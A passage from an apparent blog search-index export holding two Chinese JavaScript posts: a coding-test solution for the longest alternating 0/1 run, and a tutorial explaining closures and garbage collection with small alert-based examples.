<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Q:</span></span><br><span class="line"><span class="comment">//   输入：第一行为n,即多少个数字；第二行，为任意0和1，空格隔开；</span></span><br><span class="line"><span class="comment">//   输出：最长的相邻两个数都不相同的子串</span></span><br><span class="line"><span class="comment">// 如：</span></span><br><span class="line"><span class="comment">//   输入：</span></span><br><span class="line"><span class="comment">//       10</span></span><br><span class="line"><span class="comment">//       0 1 1 0 1 0 1 1 1 0</span></span><br><span class="line"><span class="comment">//   输出：</span></span><br><span class="line"><span class="comment">//       5</span></span><br><span class="line"><span class="comment">//在线笔试用的是Google V8引擎，读取输入用read_line()；这里模拟输入</span></span><br><span class="line"><span class="keyword">var</span> readline = <span class="string">"10 0 1 1 0 1 0 1 1 1 0"</span>;</span><br><span class="line"><span class="keyword">var</span> rl = readline.split(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">var</span> n = <span class="built_in">parseInt</span>(rl[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">var</span> num = rl.slice(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = [], cont = [];<span class="comment">//对比结果和计数数组</span></span><br><span class="line"><span class="keyword">var</span> myLength = <span class="number">1</span>;</span><br><span class="line">result.push(num[<span class="number">0</span>]);<span class="comment">//存入第一个数进行对比</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="comment">// 判断result的第i个是否等于num的第i+1个是否相等，其实就是num的第i个和i+1个是否相等；</span></span><br><span class="line">    <span class="keyword">if</span> (result[i] !== num[i + <span class="number">1</span>]) &#123;</span><br><span class="line"><span class="comment">//不等，则符合条件，长度+1，并num[i+1]存入result做下一次的对比；</span></span><br><span class="line">        myLength++;</span><br><span class="line">        result.push(num[i + <span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//相等，长度置为1，重新开始计数，并num[i+1]存入result做下一次的对比，这里也要存进去，否则result[i]会被赋值undefined</span></span><br><span class="line">        myLength = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//再写一遍，没写这个我调试了好久。。。</span></span><br><span class="line">        result.push(num[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 把每次判断之后得到的结果都存入cont数组</span></span><br><span class="line">    cont.push(myLength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对cont数组按小-&gt;大排序</span></span><br><span class="line">cont.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//输出最后一个</span></span><br><span class="line"><span class="comment">//pop()删除返回最后一个元素</span></span><br><span class="line"><span class="comment">//console.log(cont.pop());</span></span><br><span class="line"><span class="built_in">console</span>.log(cont[cont.length - <span class="number">1</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>笔试题</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>让人头大的闭包和垃圾回收机制GC</title>
    <url>/2017/09/%E8%AE%A9%E4%BA%BA%E5%A4%B4%E5%A4%A7%E7%9A%84%E9%97%AD%E5%8C%85%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6GC.html</url>
    <content><![CDATA[<blockquote>
<p>在理解了作用域和看了诸多如阮一峰大神的博客后之后，闭包还是花了很长时间去理解。</p>
</blockquote>
<p>闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。<br><a id="more"></a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">999</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = f1();</span><br><span class="line">result(); <span class="comment">// 999 //实现了从函数外部读取函数内部变量n</span></span><br></pre></td></tr></table></figure>
<h2 id="什么是闭包？"><a href="#什么是闭包？" class="headerlink" title="什么是闭包？"></a>什么是闭包？</h2><p>上面代码中的f2函数，就是闭包。</p>
<ul>
<li><p>各种专业文献上的”闭包”（closure）定义非常抽象，很难看懂。我的理解是，闭包就是能够读取其他函数（f1）内部变量的函数(f2)。</p>
</li>
<li><p>在js中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成”定义在一个函数(f1)内部的函数(f2)”。</p>
</li>
<li><p>所以，在本质上，闭包就是将函数(f1)内部和函数外部（f1外部）连接起来的一座桥梁。<strong>在js中，所有的function都是一个闭包</strong></p>
</li>
</ul>
<h2 id="闭包的用途-闭包的用途"><a href="#闭包的用途-闭包的用途" class="headerlink" title="闭包的用途 ## (#闭包的用途)"></a>闭包的用途 ## (#闭包的用途)</h2><p>闭包可以用在许多地方。它的最大用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中，即维持一个变量。</p>
<p>闭包能够通过保护函数内的变量安全（即函数的变量只能由其内部函数访问，不能被其外部访问）实现JS私有属性和私有方法；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">999</span>;</span><br><span class="line">    nAdd = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;n += <span class="number">1</span>&#125;;<span class="comment">//全局变量，没加var</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = f1();<span class="comment">//全局变量result = f2</span></span><br><span class="line">result(); <span class="comment">// 999</span></span><br><span class="line">nAdd();</span><br><span class="line">result(); <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>f2被赋予result,成为了全局变量，所以f2始终在内存中，而f2作用域链上依赖f1，所以导致f1也始终在内存中，在f1被引用后，不会被垃圾回收机制（garbage collection）回收；</li>
<li>var result=f1()这里引用了f1()；n的值为999，并一直在内存中，运行result()即f2();结果999；nAdd()后，n=n+1=1000；再次执行result()，结果1000；</li>
</ul>
<p><strong>这就是这些函数内部的变量的值始终保持在内存中</strong>。</p>
<h2 id="使用闭包的注意点"><a href="#使用闭包的注意点" class="headerlink" title="使用闭包的注意点"></a>使用闭包的注意点</h2><ul>
<li><p>由于闭包会使得函数中的变量都被保存在内存中，<strong>内存消耗很大</strong>，所以不能滥用闭包，否则会造成网页的性能问题，在<strong>IE中可能导致内存泄露</strong>。解决方法是，在<strong>退出函数之前，将不使用的局部变量全部删除</strong>。</p>
</li>
<li><p><strong>闭包会在父函数外部，改变父函数内部变量的值</strong>。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outerFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">innerFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        a++;</span><br><span class="line">        alert(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> innerFun;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = outerFun();</span><br><span class="line">obj();  <span class="comment">//1//当每次调用后，因为inner引用了outer的变量，inner(闭包)需要它们，所以这些变量的值还在内存中，不会被GC回收；</span></span><br><span class="line">obj();  <span class="comment">//2</span></span><br><span class="line"><span class="comment">// 不同引用之间变量的值不影响；</span></span><br><span class="line"><span class="keyword">var</span> obj2 = outerFun();</span><br><span class="line">obj2();  <span class="comment">//1</span></span><br><span class="line">obj2();  <span class="comment">//2</span></span><br></pre></td></tr></table></figure>
<h2 id="知道了这些，js的垃圾回收机制（GC）好懂多了！-知道了这些js的垃圾回收机制gc好懂多了"><a href="#知道了这些，js的垃圾回收机制（GC）好懂多了！-知道了这些js的垃圾回收机制gc好懂多了" class="headerlink" title="知道了这些，js的垃圾回收机制（GC）好懂多了！ ## (#知道了这些js的垃圾回收机制gc好懂多了)"></a>知道了这些，js的垃圾回收机制（GC）好懂多了！ ## (#知道了这些js的垃圾回收机制gc好懂多了)</h2><p>在Javascript中，</p>
<ul>
<li><p>如果一个对象不再被引用，那么这个对象就会被GC回收。</p>
</li>
<li><p>如果两个对象互相引用，而不再被第3者所引用，那么，引用之后这两个互相引用的对象也会被回收。就像是：</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">这里面outer和inner相互引用，引用之后会被GC回收掉；</span><br></pre></td></tr></table></figure>
<ul>
<li>如果函数a被b引用，b又被a外的c引用（闭包），则函数a执行后不会被回收的原因。</li>
</ul>
<h2 id="除此之外"><a href="#除此之外" class="headerlink" title="除此之外"></a>除此之外</h2><p>把闭包讲的很深入的一篇<a href="http://www.jb51.net/article/24101.htm" target="_blank" rel="noopener">博客</a> (target=undefined)，还讲了函数的执行环境(excution context)、活动对象(call object)、作用域(scope)、作用域链(scope chain)。并以函数a从定义到执行的过程为例阐述这几个概念。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>闭包</tag>
        <tag>垃圾回收机制</tag>
      </tags>
  </entry>
</search>
